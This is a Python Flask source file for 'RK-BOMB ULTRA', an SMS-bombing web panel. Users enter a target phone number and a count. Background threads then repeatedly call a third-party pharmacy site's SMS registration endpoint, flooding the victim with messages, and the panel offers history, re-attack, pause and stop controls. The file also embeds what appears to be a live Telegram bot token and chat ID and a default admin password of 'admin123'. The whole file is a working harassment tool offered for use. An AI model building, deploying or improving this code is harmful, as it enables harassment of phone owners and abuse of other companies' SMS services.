import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_RAIHAN_ULTRA_SaaS_V20"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
ADMIN_USERNAME = "admin"

# ---------- DATABASE HELPERS ----------
def get_db():
    conn = sqlite3.connect('system_rk.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, status TEXT)')
    conn.execute('CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY, username TEXT, phone TEXT, success INTEGER, total INTEGER, limit_amt INTEGER, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)')
    try:
        conn.execute("INSERT INTO users (username, password, status) VALUES (?, ?, ?)", 
                     (ADMIN_USERNAME, generate_password_hash("admin123"), "approved"))
        conn.commit()
    except: pass
    conn.close()

init_db()

# ---------- BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        current = active_sessions[key]
        if current['total'] >= current['limit']:
            # Save to database when finished
            conn = get_db()
            conn.execute("INSERT INTO history (username, phone, success, total, limit_amt, status) VALUES (?,?,?,?,?,?)",
                         (username, phone, current['success'], current['total'], current['limit'], "Completed"))
            conn.commit()
            conn.close()
            del active_sessions[key]
            break
        
        if current['status'] == 'Running':
            try:
                # API Endpoint Example
                r = requests.get(f"https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={phone}", timeout=5)
                active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            time.sleep(1.5)
        else:
            time.sleep(2) # Paused state - just wait

# ---------- CSS & LAYOUT ----------
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RK-BOMB ★ ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
        body { background: #050505; color: #fff; margin: 0; padding: 0; }
        .header { background: #111; padding: 15px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
        .sidebar { height: 100%; width: 0; position: fixed; z-index: 1001; top: 0; left: 0; background: #000; overflow-x: hidden; transition: 0.3s; padding-top: 60px; border-right: 1px solid #0f0; }
        .sidebar a { padding: 15px 25px; text-decoration: none; font-size: 20px; color: #0f0; display: block; border-bottom: 1px solid #111; }
        .container { padding: 15px; max-width: 500px; margin: auto; }
        .card { background: #111; border-radius: 12px; padding: 20px; margin-bottom: 15px; border: 1px solid #222; position: relative; overflow: hidden; }
        .card::before { content: ''; position: absolute; top:0; left:0; width:4px; height:100%; background: #0f0; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .stat-item { background: #1a1a1a; padding: 10px; border-radius: 8px; text-align: center; border: 1px solid #333; }
        .stat-val { display: block; font-size: 22px; color: #0f0; font-weight: bold; }
        
        input { width: 100%; padding: 12px; background: #000; border: 1px solid #0f0; color: #fff; border-radius: 8px; margin-bottom: 10px; font-size: 16px; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 5px; text-transform: uppercase; }
        .btn-start { background: #0f0; color: #000; }
        .btn-pause { background: #ffcc00; color: #000; }
        .btn-resume { background: #00ccff; color: #000; }
        .btn-stop { background: #ff3333; color: #fff; }
        .btn-re { background: #8e44ad; color: #fff; width: auto; padding: 5px 15px; font-size: 12px; }
        
        .progress-bg { background: #333; height: 8px; border-radius: 4px; margin: 10px 0; }
        .progress-bar { background: #0f0; height: 100%; border-radius: 4px; transition: 0.5s; }
        .badge { padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
        .badge-run { background: rgba(0,255,0,0.2); color: #0f0; }
        .badge-pause { background: rgba(255,204,0,0.2); color: #ffcc00; }
    </style>
</head>
<body>
<div id="rkSidebar" class="sidebar">
    <a href="javascript:void(0)" onclick="closeNav()" style="color:red; font-size:30px;">&times; CLOSE</a>
    <a href="/dashboard">🏠 HOME DASHBOARD</a>
    <a href="/history">📜 ATTACK HISTORY</a>
    <a href="/logout">🛑 LOGOUT</a>
</div>
<div class="header">
    <span style="font-size:24px; cursor:pointer; color:#0f0;" onclick="openNav()">&#9776;</span>
    <span style="font-weight:bold; color:#0f0; letter-spacing:2px;">RK-BOMB ULTRA</span>
    <span style="width:24px;"></span>
</div>
<div class="container">
    [CONTENT_HERE]
</div>
<script>
    function openNav() { document.getElementById("rkSidebar").style.width = "280px"; }
    function closeNav() { document.getElementById("rkSidebar").style.width = "0"; }
</script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def home():
    if 'user' in session: return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form['u'], request.form['p']
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ?", (u,)).fetchone()
        conn.close()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '''
        <div class="card">
            <h2 style="text-align:center; color:#0f0;">SYSTEM ACCESS</h2>
            <form method="POST">
                <input name="u" placeholder="USERNAME" required>
                <input name="p" type="password" placeholder="PASSWORD" required>
                <button class="btn btn-start">LOGIN NOW</button>
            </form>
        </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    
    # Get Stats
    conn = get_db()
    last = conn.execute("SELECT phone FROM history WHERE username = ? ORDER BY id DESC LIMIT 1", (session['user'],)).fetchone()
    total_att = conn.execute("SELECT COUNT(*) as cnt FROM history WHERE username = ?", (session['user'],)).fetchone()
    conn.close()
    
    running_count = sum(1 for k in active_sessions if k.startswith(session['user']))

    content = f'''
    <div class="stats-grid">
        <div class="stat-item"><span class="stat-val">{running_count}</span>Running</div>
        <div class="stat-item"><span class="stat-val">{total_att['cnt']}</span>History</div>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0;">🚀 NEW ATTACK</h3>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="TARGET NUMBER" required>
            <input name="amt" type="number" placeholder="AMOUNT" required>
            <button class="btn btn-start">LAUNCH FIRE</button>
        </form>
        <small style="color:#666;">Last Attack: {last['phone'] if last else 'None'}</small>
    </div>

    <div id="live-area"></div>

    <script>
        function updateLive() {{
            fetch('/api/status').then(r => r.json()).then(data => {{
                let h = '';
                for(let k in data) {{
                    let s = data[k];
                    let per = Math.round((s.total/s.limit)*100);
                    let badge = s.status == 'Running' ? '<span class="badge badge-run">RUNNING</span>' : '<span class="badge badge-pause">PAUSED</span>';
                    let ctrlBtn = s.status == 'Running' ? 
                        `<button class="btn btn-pause" onclick="location.href='/api/control?num=${{s.phone}}&action=Pause'">⏸ PAUSE</button>` :
                        `<button class="btn btn-resume" onclick="location.href='/api/control?num=${{s.phone}}&action=Running'">▶ RESUME</button>`;
                    
                    h += `<div class="card">
                        <div style="display:flex; justify-content:space-between;">
                            <b>📱 ${{s.phone}}</b> ${{badge}}
                        </div>
                        <div class="progress-bg"><div class="progress-bar" style="width:${{per}}%"></div></div>
                        <div style="font-size:14px; margin-bottom:10px;">Progress: ${{s.success}} / ${{s.limit}}</div>
                        ${{ctrlBtn}}
                        <button class="btn btn-stop" onclick="location.href='/api/stop?num=${{s.phone}}'">🛑 STOP ATTACK</button>
                    </div>`;
                }}
                document.getElementById('live-area').innerHTML = h;
            }});
        }}
        setInterval(updateLive, 2000);
        updateLive();
    </script>
    '''
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', content))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    conn = get_db()
    rows = conn.execute("SELECT * FROM history WHERE username = ? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    
    h_html = '<h3>📜 ATTACK HISTORY</h3>'
    for r in rows:
        h_html += f'''
        <div class="card" style="padding:15px; font-size:14px;">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <b>📱 {r['phone']}</b>
                <a href="/api/start?num={r['phone']}&amt={r['limit_amt']}" class="btn btn-re">RE-ATTACK</a>
            </div>
            <div style="color:#aaa; margin-top:5px;">
                Success: {r['success']} | Limit: {r['limit_amt']} | Status: {r['status']}
            </div>
        </div>'''
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', h_html))

# ---------- APIs ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0))
    if u and num and amt:
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'total': 0, 'limit': amt, 'status': 'Running'}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    action = request.args.get('action')
    if key in active_sessions: active_sessions[key]['status'] = action
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions:
        s = active_sessions[key]
        conn = get_db()
        conn.execute("INSERT INTO history (username, phone, success, total, limit_amt, status) VALUES (?,?,?,?,?,?)",
                     (session['user'], s['phone'], s['success'], s['total'], s['limit'], "Stopped"))
        conn.commit()
        conn.close()
        del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    return jsonify({k:v for k,v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
